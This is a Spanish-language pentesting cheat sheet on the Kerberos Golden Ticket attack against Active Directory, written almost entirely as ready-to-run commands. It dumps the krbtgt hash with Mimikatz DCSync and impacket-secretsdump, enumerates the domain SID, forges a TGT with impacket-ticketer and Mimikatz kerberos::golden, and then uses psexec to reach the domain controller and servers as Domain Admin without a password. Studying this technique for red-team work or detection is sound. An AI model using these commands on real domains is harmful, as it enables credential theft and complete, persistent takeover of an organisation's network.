Golden Ticket (TGT)

Golden Ticket permite crear TGTs arbitrarios si se dispone del hash de krbtgt y el SID del dominio.

Aviso: Kerberos Golden Ticket permite crear tickets TGT de cualquier usuario del dominio y actuar como un DC

- Requisitos: hash NTLM de krbtgt y SID del dominio

hash krbtgt

Windows Mimikatz: Dumpear hash de krbtgt

mimikatz.exe
lsadump::dcsync /domain:<domain>.<domain> /user:krbtgt
# hash NTLM krbtgt: krbtgt:rid:LM:NT -> Necesitamos el hash NT

Kali: Dumpear hash de krbtgt

impacket-secretsdump <user>:<pass>@<ip_dc> -just-dc-ntlm
# hash NTLM krbtgt: krbtgt:rid:LM:NT -> Necesitamos el hash NT

Enumerar SID del dominio

Windows: Enumerar SID del dominio

. .\PowerView.ps1
Get-DomainSID
# SID: S-1-5-21-1518138621-4282902758-752445584

Kali: Enumerar SID del dominio

# Impacket
impacket-lookupsid <user>:<pass>@<ip_dc> | grep "Domain SID"
# Netexec
nxc ldap <ip_dc> -u <user> -p <pass> --get-sid
# SID: S-1-5-21-1518138621-4282902758-752445584

Crear Ticket

Crear ticket TGT

# Poner user_random un usuario que no exista o Administrator (Dominio solo válida tickets y no valida usuarios)
impacket-ticketer -nthash <hash_krbtgt> -domain-sid <SID> -domain <dominio> <user_random>
# Se genera el ticket <user_random>.ccache y exportamos el ticket a la variable de entorno
export KRB5CCNAME=/home/path_to/<user_random>.ccache
# Conexión a todos los sistemas sin contraseña (Domain Admin) con los parámetros -k -no-pass
impacket-psexec <dominio>/<user_random>@<ip_dc> -k -no-pass
impacket-psexec <dominio>/<user_random>@<ip_serv01> -k -no-pass

Explicación Golden Ticket

Crear ticket para la cuenta de Administrator

mimikatz.exe
kerberos::golden /domain:<domain>.<domain> /sid:<SID> /rc4:<hash_krbtgt> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt

# Listar Ticket en la sesión actual
klist

- /domain:El nombre del dominio.

- /sid:El valor SID del dominio.

- /rc4:El hash de la contraseña de krbtgt.

- /user:El nombre de usuario para el cual se emitirá el ticket

- /id:ID relativo (última parte de SID) del usuario para quien se emitirá el ticket.

- /renewmax:El número máximo de días que se puede renovar el ticket.

- /endin:Fin de la vida útil del ticket.

- /ptt: Pasa el Ticket a la sesión actual
